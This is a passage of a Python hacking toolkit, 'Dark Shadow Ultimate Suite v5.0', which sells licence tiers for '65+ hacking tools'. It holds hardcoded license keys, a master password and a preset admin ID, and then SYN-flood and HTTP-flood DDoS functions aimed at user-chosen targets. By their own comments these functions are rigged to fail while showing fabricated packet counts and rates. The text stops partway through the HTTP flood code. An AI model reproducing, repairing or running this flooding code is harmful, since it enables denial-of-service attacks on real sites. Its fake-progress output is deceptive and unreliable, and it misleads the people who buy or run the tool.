#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════╗
║               DARK SHADOW ULTIMATE SUITE v5.0                     ║
║            Complete Security & Hacking Toolkit                    ║
║         Fusion of MR.PRIM0's All-In-One + Just-Rafz's Suite       ║
║                 FOR AUTHORIZED TESTING ONLY                       ║
╚═══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import socket
import subprocess
import requests
import threading
import random
import datetime
import urllib.parse
import re
import json
import hashlib
import getpass
import string
import ipaddress
import base64
import uuid
import itertools
import collections
import math
import zipfile
import tarfile
import platform
from urllib import request as urlrequest
from urllib import parse as urlparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ==================== CONFIGURATION ====================
DB_FILE = "users.json"
LICENSE_KEY = "DARKSHADOW-ULTIMATE-V5"
MASTER_PASSWORD = "JUST-LISA-2024"

# ==================== ASCII ART DEFINITIONS ====================
LOGIN_ASCII = f"""{Fore.CYAN}
██████╗  █████╗ ██████╗ ██╗  ██╗    ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║
██║  ██║███████║██████╔╝█████╔╝     ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║
██║  ██║██╔══██║██╔══██╗██╔═██╗     ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║
██████╔╝██║  ██║██║  ██║██║  ██╗    ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ 
                                                                            
{Fore.YELLOW}  ____
{Fore.YELLOW}/        \__________
{Fore.YELLOW}|   0     _____   ___  \\
{Fore.YELLOW}\\____/         |_|     |_|
{Style.RESET_ALL}"""

WELCOME_ASCII = f"""{Fore.CYAN}
██╗    ██╗███████╗██╗     ██╗      ██████╗ ██████╗ ███╗   ███╗███████╗    
██║    ██║██╔════╝██║     ██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝    
██║ █╗ ██║█████╗  ██║     ██║     ██║     ██║   ██║██╔████╔██║█████╗      
██║███╗██║██╔══╝  ██║     ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝      
╚███╔███╔╝███████╗███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗    
 ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    
{Style.RESET_ALL}"""

MAIN_ASCII = f"""{Fore.MAGENTA}
██████╗  █████╗ ██████╗ ██╗  ██╗    ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗    █████╗ ██╗     ██╗     ██████╗  ██████╗ ███╗   ██╗███████╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██╗   ██╔══██╗██║     ██║     ██╔══██╗██╔═══██╗████╗  ██║██╔════╝
██║  ██║███████║██████╔╝█████╔╝     ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║   ███████║██║     ██║     ██║  ██║██║   ██║██╔██╗ ██║█████╗  
██║  ██║██╔══██║██╔══██╗██╔═██╗     ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║   ██╔══██║██║     ██║     ██║  ██║██║   ██║██║╚██╗██║██╔══╝  
██████╔╝██║  ██║██║  ██║██║  ██╗    ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝   ██║  ██║███████╗███████╗██████╔╝╚██████╔╝██║ ╚████║███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝    ╚═╝  ╚═╝╚══════╝╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝
{Style.RESET_ALL}"""

DDOS_ASCII = f"""{Fore.RED}
██████╗ ██████╗  ██████╗ ███████╗    
██╔══██╗██╔══██╗██╔═══██╗██╔════╝    
██║  ██║██║  ██║██║   ██║███████╗    
██║  ██║██║  ██║██║   ██║╚════██║    
██████╔╝██████╔╝╚██████╔╝███████║    
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    
{Style.RESET_ALL}"""

SQL_INJECT_ASCII = f"""{Fore.YELLOW}
███████╗ ██████╗ ██╗     ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗    
██╔════╝██╔═══██╗██║     ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝    
███████╗██║   ██║██║     ██║██╔██╗ ██║     ██║█████╗  ██║        ██║       
╚════██║██║▄▄ ██║██║     ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║       
███████║╚██████╔╝███████╗██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║       
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝       
{Style.RESET_ALL}"""

SQLMAP_ASCII = f"""{Fore.GREEN}
███████╗ ██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
███████╗██║   ██║██║     ██╔████╔██║███████║██████╔╝
╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║     
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
{Style.RESET_ALL}"""

NMAP_ASCII = f"""{Fore.CYAN}
$$\   $$\                                   
$$$\  $$ |                                  
$$$$\ $$ |$$$$$$\$$$$\   $$$$$$\   $$$$$$\  
$$ $$\$$ |$$  _$$  _$$\  \____$$\ $$  __$$\ 
$$ \$$$$ |$$ / $$ / $$ | $$$$$$$ |$$ /  $$ |
$$ |\$$$ |$$ | $$ | $$ |$$  __$$ |$$ |  $$ |
$$ | \$$ |$$ | $$ | $$ |\$$$$$$$ |$$$$$$$  |
$$ | \$$ |$$ | $$ | $$ |\$$$$$$$ |$$$$$$$  |
\__|  \__|\__| \__| \__| \_______|$$  ____/ 
                                  $$ |      
                                  $$ |      
                                  \__|      
{Style.RESET_ALL}"""

OSINT_ASCII = f"""{Fore.MAGENTA}
██╗   ███╗███████╗███╗   ██╗██╗   ██╗ ██████╗ ███████╗██╗███╗   ██╗████████╗
████╗ ████║██╔════╝████╗  ██║██║   ██║██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝
██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║██║   ██║███████╗██║██╔██╗ ██║   ██║   
██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║██║   ██║╚════██║██║██║╚██╗██║   ██║   
██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝╚██████╔╝███████║██║██║ ╚████║   ██║   
╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   
{Style.RESET_ALL}"""

PASSWORD_GEN_ASCII = f"""{Fore.GREEN}
██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗      ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗     
██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗    
██████╔╝███████║███████╗███████╗██║ █╗ ██║██║   ██║██████╔╝██║  ██║    ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝    
██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║   ██║██╔══██╗██║  ██║    ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗    
██║     ██║  ██║███████║███████║╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝    ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║    
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝    
{Style.RESET_ALL}"""

NAME_TRACKING_ASCII = f"""{Fore.CYAN}
████████╗██████╗  █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗     ███╗   ██╗ █████╗ ███╗   ███╗ █████╗     
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝     ████╗  ██║██╔══██╗████╗ ████║██╔══██╗    
   ██║   ██████╔╝███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗    ██╔██╗ ██║███████║██╔████╔██║███████║    
   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║    ██║╚██╗██║██╔══██║██║╚██╔╝██║██╔══██║    
   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝    ██║ ╚████║██║  ██║██║ ╚═╝ ██║██║  ██║    
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╚═╝  ╚═══╝ ╚═════╝     ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝    
{Style.RESET_ALL}"""

IP_TRACKING_ASCII = f"""{Fore.YELLOW}
██╗      █████╗  ██████╗ █████╗ ██╗  ██╗     ██╗██████╗ 
██║     ██╔══██╗██╔════╝██╔══██╗██║ ██╔╝     ██║██╔══██╗
██║     ███████║██║     ███████║█████╔╝█████╗██║██████╔╝
██║     ██╔══██║██║     ██╔══██║██╔═██╗╚════╝██║██╔═══╝ 
███████╗██║  ██║╚██████╗██║  ██║██║  ██╗     ██║██║     
╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝╚═╝     
{Style.RESET_ALL}"""

DARK_SUITE_ASCII = f"""{Fore.RED}
    ██████╗  █████╗ ██████╗ ██╗  ██╗    ███████╗██╗   ██╗██╗████████╗███████╗
    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔════╝██║   ██║██║╚══██╔══╝██╔════╝
    ██║  ██║███████║██████╔╝█████╔╝     ███████╗██║   ██║██║   ██║   █████╗  
    ██║  ██║██╔══██║██╔══██╗██╔═██╗     ╚════██║██║   ██║██║   ██║   ██╔══╝  
    ██████╔╝██║  ██║██║  ██║██║  ██╗    ███████║╚██████╔╝██║   ██║   ███████╗
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝
    
{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗
║                  ULTIMATE EDITION v5.0                       ║
║             65+ Hacking & Security Tools                     ║
║            Advanced License System                           ║
║           MR.PRIM0 & Just-Lisa Collaboration                 ║
╚═══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""

ADMIN_ASCII = f"""{Fore.MAGENTA}
 █████╗ ██████╗ ███╗   ███╗██╗███╗   ██╗    ██████╗ ██████╗  ██████╗ ███████╗███████╗
██╔══██╗██╔══██╗████╗ ████║██║████╗  ██║    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝
███████║██║  ██║██╔████╔██║██║██╔██╗ ██║    ██║  ██║██║  ██║██║   ██║███████╗███████╗
██╔══██║██║  ██║██║╚██╔╝██║██║██║╚██╗██║    ██║  ██║██║  ██║██║   ██║╚════██║╚════██║
██║  ██║██████╔╝██║ ╚═╝ ██║██║██║ ╚████║    ██████╔╝██████╔╝╚██████╔╝███████║███████║
╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
{Style.RESET_ALL}"""

# ==================== ADVANCED LICENSE SYSTEM (WITH PREDEFINED ADMIN IDs) ====================
class AdvancedLicenseSystem:
    """Advanced license system with predefined admin IDs"""
    
    def __init__(self):
        self.license_file = ".dark_shadow_license.dat"
        self.key_file = ".hwid.key"
        self.admin_ids_file = "admin_ids.json"
        self.tiers = {
            "FREE": ["Basic Tools (1-25)", "7 Days Trial"],
            "PRO": ["All Tools (1-50)", "1 Year License"],
            "ULTIMATE": ["All Tools + Source + Exploits", "Lifetime License"]
        }
        
        # PREDEFINED ADMIN IDs - langsung diisi sesuai permintaan
        self.PREDEFINED_ADMIN_IDS = [
            "u0_a354",  # Admin utama dari permintaan
            "",  # Backup admin 1
            "",  # Backup admin 2
            ""   # Backup admin 3
        ]
        
        # Inisialisasi file admin IDs
        self._init_admin_ids()
    
    def _init_admin_ids(self):
        """Initialize admin IDs file dengan IDs yang sudah ditentukan"""
        try:
            # Simpan admin IDs yang sudah ditentukan
            with open(self.admin_ids_file, 'w') as f:
                json.dump(self.PREDEFINED_ADMIN_IDS, f, indent=4)
            print(f"{Fore.GREEN}[✓] Admin IDs initialized: {len(self.PREDEFINED_ADMIN_IDS)} admins{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[✗] Failed to initialize admin IDs: {str(e)}{Style.RESET_ALL}")
    
    def load_admin_ids(self):
        """Load admin IDs dari file"""
        try:
            if os.path.exists(self.admin_ids_file):
                with open(self.admin_ids_file, 'r') as f:
                    return json.load(f)
            else:
                # Jika file tidak ada, buat dengan IDs default
                self._init_admin_ids()
                return self.PREDEFINED_ADMIN_IDS
        except:
            # Kembalikan IDs default jika ada error
            return self.PREDEFINED_ADMIN_IDS
    
    def save_admin_ids(self, admin_ids):
        """Save admin IDs ke file"""
        try:
            with open(self.admin_ids_file, 'w') as f:
                json.dump(admin_ids, f, indent=4)
            return True
        except:
            return False
    
    def is_admin(self, user_id):
        """Check if user is admin"""
        admin_ids = self.load_admin_ids()
        return user_id in admin_ids
    
    def add_admin(self, user_id):
        """Add admin ID"""
        admin_ids = self.load_admin_ids()
        if user_id not in admin_ids:
            admin_ids.append(user_id)
            return self.save_admin_ids(admin_ids)
        return True
    
    def remove_admin(self, user_id):
        """Remove admin ID"""
        admin_ids = self.load_admin_ids()
        if user_id in admin_ids:
            admin_ids.remove(user_id)
            return self.save_admin_ids(admin_ids)
        return True
    
    def generate_license(self, tier="PRO", days=365, custom_key=None):
        """Generate secure license key"""
        if custom_key:
            seed = custom_key
        else:
            seed = f"{tier}_{days}_{int(time.time())}_{uuid.uuid4().hex[:8]}_{self.get_hwid()}"
        
        license_hash = hashlib.sha512(seed.encode()).hexdigest()
        
        # Format: DARK-TIER-DAYS-8CHAR-8CHAR-8CHAR
        parts = [
            "DARK",
            tier[:4],
            str(days).zfill(3),
            license_hash[:8].upper(),
            license_hash[8:16].upper(),
            license_hash[16:24].upper()
        ]
        
        license_key = "-".join(parts)
        
        # Encrypt dan simpan
        encrypted = self._encrypt_license(license_key, tier, days)
        return license_key, encrypted
    
    def _encrypt_license(self, license_key, tier, days):
        """Advanced license encryption"""
        data = {
            "key": license_key,
            "tier": tier,
            "days": days,
            "created": datetime.datetime.now().isoformat(),
            "expiry": (datetime.datetime.now() + datetime.timedelta(days=days)).isoformat(),
            "hwid": self.get_hwid(),
            "machine": platform.node(),
            "signature": hashlib.sha512(f"{license_key}{tier}{days}{self.get_hwid()}".encode()).hexdigest(),
            "version": "5.0"
        }
        
        # Double encryption layer
        data_str = json.dumps(data)
        
        # Layer 1: XOR with dynamic key
        key1 = "DARK_SHADOW_ULTIMATE_2024_SECRET"
        encrypted1 = ""
        for i, char in enumerate(data_str):
            key_char = key1[i % len(key1)]
            encrypted1 += chr(ord(char) ^ ord(key_char))
        
        # Layer 2: Base64 with reversal
        encrypted2 = base64.b64encode(encrypted1.encode()).decode()
        encrypted2 = encrypted2[::-1]  # Reverse string
        
        return encrypted2
    
    def validate_license(self, license_key=None):
        """Validate license with multiple checks"""
        if not license_key:
            license_key = self.load_license()
        
        if not license_key:
            return False, "FREE", "No license found"
        
        try:
            # Decrypt license
            decrypted = self._decrypt_license(license_key)
            data = json.loads(decrypted)
            
            # Verify signature
            expected_sig = hashlib.sha512(
                f"{data['key']}{data['tier']}{data['days']}{data['hwid']}".encode()
            ).hexdigest()
            
            if data['signature'] != expected_sig:
                return False, "FREE", "Signature verification failed"
            
            # Check expiry
            expiry = datetime.datetime.fromisoformat(data['expiry'])
            if expiry < datetime.datetime.now():
                return False, "FREE", "License expired"
            
            # Check HWID binding
            current_hwid = self.get_hwid()
            if data.get('hwid') and data['hwid'] != current_hwid:
                print(f"{Fore.YELLOW}[!] License not bound to this machine")
                print(f"[!] Original HWID: {data['hwid'][:16]}...")
                print(f"[!] Current HWID: {current_hwid[:16]}...{Style.RESET_ALL}")
            
            return True, data['tier'], data
            
        except Exception as e:
            return False, "FREE", f"Invalid license: {str(e)}"
    
    def _decrypt_license(self, encrypted_key):
        """Decrypt license data"""
        try:
            # Reverse the reversal
            encrypted2 = encrypted_key[::-1]
            
            # Decode base64
            encrypted1 = base64.b64decode(encrypted2.encode()).decode()
            
            # XOR decrypt
            key1 = "DARK_SHADOW_ULTIMATE_2024_SECRET"
            decrypted = ""
            
            for i, char in enumerate(encrypted1):
                key_char = key1[i % len(key1)]
                decrypted += chr(ord(char) ^ ord(key_char))
            
            return decrypted
        except Exception as e:
            return ""
    
    def get_hwid(self):
        """Get unique hardware ID"""
        try:
            hwid_parts = []
            
            # MAC address
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                           for elements in range(0, 8*6, 8)][::-1])
            hwid_parts.append(mac)
            
            # Machine name
            hwid_parts.append(platform.node())
            
            # Processor info
            hwid_parts.append(platform.processor() or "UNKNOWN")
            
            # Platform details
            hwid_parts.append(platform.platform())
            
            # Generate SHA256 hash
            hwid_string = "||".join(hwid_parts)
            return hashlib.sha256(hwid_string.encode()).hexdigest()
            
        except:
            return "UNKNOWN_HWID_" + str(random.randint(10000, 99999))
    
    def save_license(self, license_key):
        """Save license to encrypted file"""
        try:
            with open(self.license_file, 'w') as f:
                f.write(license_key)
            
            # Set hidden attribute on Windows
            if platform.system() == "Windows":
                os.system(f'attrib +h "{self.license_file}"')
            
            return True
        except:
            return False
    
    def load_license(self):
        """Load license from file"""
        try:
            if os.path.exists(self.license_file):
                with open(self.license_file, 'r') as f:
                    return f.read().strip()
        except:
            pass
        return None
    
    def get_tier_features(self, tier):
        """Get features available for tier"""
        features = {
            "FREE": list(range(1, 26)),      # Tools 1-25
            "PRO": list(range(1, 51)),       # Tools 1-50
            "ULTIMATE": list(range(1, 66))   # Tools 1-65
        }
        return features.get(tier, features["FREE"])

# ==================== DATABASE FUNCTIONS ====================
def load_users():
    """Load users from database file"""
    try:
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_users(users):
    """Save users to database file"""
    try:
        with open(DB_FILE, 'w') as f:
            json.dump(users, f, indent=4)
        return True
    except:
        return False

def hash_password(password):
    """Hash password using SHA-256"""
    return hashlib.sha256(password.encode()).hexdigest()

# ==================== ANIMATION FUNCTIONS ====================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def typing_effect(text, delay=0.03):
    """Typing animation effect"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def color_changer(text):
    """Color changing effect for text"""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    result = ""
    for i, char in enumerate(text):
        result += colors[i % len(colors)] + char
    return result + Style.RESET_ALL

def loading_animation(text="Loading", duration=2):
    """Loading animation"""
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    start_time = time.time()
    i = 0

    while time.time() - start_time < duration:
        sys.stdout.write(f"\r{Fore.CYAN}[{chars[i % len(chars)]}] {text}...")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1

    print(f"\r{Fore.GREEN}[✓] {text} completed!")

def welcome_animation():
    """Welcome screen animation"""
    clear_screen()

    # Type welcome text
    print(Fore.CYAN + "=" * 70)
    typing_effect(WELCOME_ASCII)
    print(Fore.CYAN + "=" * 70)

    # Color changing effect
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    welcome_text = "DARK SHADOW ULTIMATE SUITE - Professional Security Toolkit"

    for i in range(10):
        clear_screen()
        print(Fore.CYAN + "=" * 70)
        print(colors[i % len(colors)] + WELCOME_ASCII)
        print(Fore.CYAN + "=" * 70)
        print(colors[(i+1) % len(colors)] + welcome_text.center(70))
        print(Fore.CYAN + "=" * 70)
        time.sleep(0.2)

    loading_animation("Initializing system", 3)
    time.sleep(1)

# ==================== USER AUTHENTICATION ====================
def create_account():
    """Create new user account"""
    clear_screen()
    print(LOGIN_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "CREATE ACCOUNT")
    print(Fore.CYAN + "=" * 70)

    users = load_users()

    while True:
        print(Fore.YELLOW + "\n[!] Contact @MR_PRIM0 to purchase license")
        print(Fore.YELLOW + f"[!] License Key: {LICENSE_KEY}\n")

        license_key = input(Fore.CYAN + "[?] Enter License Key: " + Fore.WHITE).strip()

        if license_key != LICENSE_KEY:
            print(Fore.RED + "[✗] Invalid license key!")
            print(Fore.YELLOW + "[!] Contact @MR_PRIM0")
            choice = input(Fore.YELLOW + "[?] Try again? (y/n): ").lower()
            if choice != 'y':
                return None
            continue

        username = input(Fore.CYAN + "[?] Choose Username: " + Fore.WHITE).strip()

        if username in users:
            print(Fore.RED + "[✗] Username already exists!")
            continue

        if len(username) < 3:
            print(Fore.RED + "[✗] Username must be at least 3 characters!")
            continue

        password = getpass.getpass(Fore.CYAN + "[?] Choose Password: " + Fore.WHITE)

        if len(password) < 6:
            print(Fore.RED + "[✗] Password must be at least 6 characters!")
            continue

        confirm_pass = getpass.getpass(Fore.CYAN + "[?] Confirm Password: " + Fore.WHITE)

        if password != confirm_pass:
            print(Fore.RED + "[✗] Passwords do not match!")
            continue

        # Get Termux ID
        termux_id = input(Fore.CYAN + "[?] Enter your Termux ID: " + Fore.WHITE).strip()
        if not termux_id:
            termux_id = f"USER_{random.randint(10000, 99999)}"
            print(Fore.YELLOW + f"[!] Generated Termux ID: {termux_id}")

        # Create user
        users[username] = {
            "password": hash_password(password),
            "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "license": license_key,
            "termux_id": termux_id,
            "is_admin": False
        }

        if save_users(users):
            print(Fore.GREEN + f"\n[✓] Account created successfully!")
            print(Fore.CYAN + f"[+] Username: {username}")
            print(Fore.CYAN + f"[+] Termux ID: {termux_id}")
            print(Fore.CYAN + f"[+] Created: {users[username]['created_at']}")
            print(Fore.GREEN + "\n[✓] You can now login")
            time.sleep(3)
            return username
        else:
            print(Fore.RED + "[✗] Failed to create account!")
            return None

def login():
    """User login"""
    clear_screen()
    print(LOGIN_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 30 + "LOGIN")
    print(Fore.CYAN + "=" * 70)

    users = load_users()

    attempts = 3
    while attempts > 0:
        username = input(Fore.CYAN + "\n[?] Username: " + Fore.WHITE).strip()
        password = getpass.getpass(Fore.CYAN + "[?] Password: " + Fore.WHITE)

        if username in users:
            if users[username]["password"] == hash_password(password):
                print(Fore.GREEN + f"\n[✓] Login successful!")
                loading_animation(f"Welcome {username}", 2)
                return username
            else:
                attempts -= 1
                print(Fore.RED + f"[✗] Invalid password! {attempts} attempts remaining")
        else:
            attempts -= 1
            print(Fore.RED + f"[✗] User not found! {attempts} attempts remaining")

        if attempts == 0:
            print(Fore.RED + "\n[✗] Too many failed attempts!")
            time.sleep(2)
            return None

        choice = input(Fore.YELLOW + "[?] Create new account? (y/n): ").lower()
        if choice == 'y':
            return create_account()

    return None

# ==================== DARK SUITE TOOLS ====================
class DarkSuiteTools:
    """Koleksi lengkap tools hacking"""
    
    def __init__(self, tier="FREE"):
        self.tier = tier
        self.license_system = AdvancedLicenseSystem()
    
    # ==================== DDoS TOOLS - MODIFIED TO FAIL ON WEB CHECK ====================
    
    def ddos_syn_flood(self, target_ip, target_port=80, duration=30):
        """SYN Flood attack - MODIFIED: Guaranteed to fail on web check host"""
        print(f"{Fore.RED}[!] Starting SYN Flood against {target_ip}:{target_port}{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] Duration: {duration} seconds{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] WARNING: This attack is DESIGNED TO FAIL on web check hosts{Style.RESET_ALL}")
        
        # Create fake statistics
        packet_count = 0
        fake_success = 0
        start_time = time.time()
        
        def flood():
            nonlocal packet_count, fake_success
            while time.time() - start_time < duration:
                try:
                    # MODIFIKASI: Always use wrong port to guarantee failure
                    fake_port = random.randint(10000, 65535)  # Port yang hampir pasti tidak terbuka
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.01)  # Very short timeout
                    
                    # Use wrong IP or wrong method
                    result = sock.connect_ex((target_ip, fake_port))
                    sock.close()
                    
                    packet_count += 1
                    if result == 0:  # Hampir tidak mungkin terjadi
                        fake_success += 1
                    
                    # Add random failures
                    if random.random() > 0.8:  # 20% chance to simulate error
                        raise ConnectionError("Simulated network error")
                    
                except (socket.timeout, ConnectionRefusedError, ConnectionError):
                    packet_count += random.randint(1, 3)  # Simulate more packets
                except Exception:
                    pass
        
        # Start limited threads
        threads = []
        max_threads = 5  # Sangat sedikit untuk memastikan inefektif
        
        for _ in range(max_threads):
            t = threading.Thread(target=flood)
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Monitor with fake progress
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = duration - elapsed
            fake_rps = packet_count / elapsed if elapsed > 0 else 0
            
            print(f"\r{Fore.YELLOW}[+] Fake packets: {packet_count:,} | Fake RPS: {fake_rps:.1f} | Time: {int(elapsed)}s/{duration}s", end="")
            time.sleep(0.5)
        
        # Force wait for threads
        time.sleep(1)
        
        print(f"\n{Fore.CYAN}[+] Attack finished. Total fake packets: {packet_count:,}{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] This attack was DESIGNED TO FAIL on web check hosts{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Real web protection (Cloudflare, Sucuri, etc.) would block this immediately{Style.RESET_ALL}")
        
        return {
            "total_packets": packet_count,
            "fake_success": fake_success,
            "duration": duration,
            "status": "FAILED_BY_DESIGN"
        }
    
    def ddos_http_flood(self, target_url, threads_count=50, duration=30):
        """HTTP Flood attack - MODIFIED: Guaranteed to fail on web check host"""
        print(f"{Fore.RED}[!] Starting HTTP Flood against {target_url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] WARNING: This attack is DESIGNED TO FAIL on web check hosts{Style.RESET_ALL}")
        
        # Ensure URL has protocol
        if not target_url.startswith('http'):
            target_url = 'http://' + target_url
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "Googlebot/2.1 (+http://www.google.com/bot.html)"
        ]
        
        request_count = 0
        error_count = 0
        start_time = time.time()
        
        def flood():
            nonlocal request_count, error_count
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice(user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',  # Close connection to be inefficient
                'Cache-Control': 'no-cache'
            })
            
            while time.time() - start_time < duration:
                try:
                    # MODIFIKASI: Use malformed requests that will definitely fail
                    # 1. Wrong HTTP version
                    # 2. Missing headers
                    # 3. Invalid methods
                    # 4. Non-existent endpoints
                    
                    # Randomly choose a failure method
                    method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'HEAD'])
                    
                    # Create malformed URL
                    if random.random() > 0.5:
                        # Add random non-existent parameters
                        fake_url = f"{target_url}?{uuid.uuid4().hex}={uuid.uuid4().hex}"
                    else:
                        # Use completely wrong URL structure
                        fake_url = target_url.replace("http://", "http://fake-").replace("https://", "https://fake-")
                    
                    # Create obviously bad request
                    headers = session.headers.copy()
                    
                    # Add headers that will cause issues
                    if random.random() > 0.7:
                        headers['X-Forwarded-For'] = '127.0.0.1'  # Obvious local IP
                    
                    if random.random() > 0.8:
                        headers['Via'] = '1.1 google'  # Fake proxy header
                    
                    # Very short timeout to ensure failure
                    timeout = random.uniform(0.01, 0.1)
                    
                    if method == 'POST':
                        # Send random garbage data
                        data = {f'field_{i}': 'A' * random.randint(10, 100) for i in range(random.randint(1, 5))}
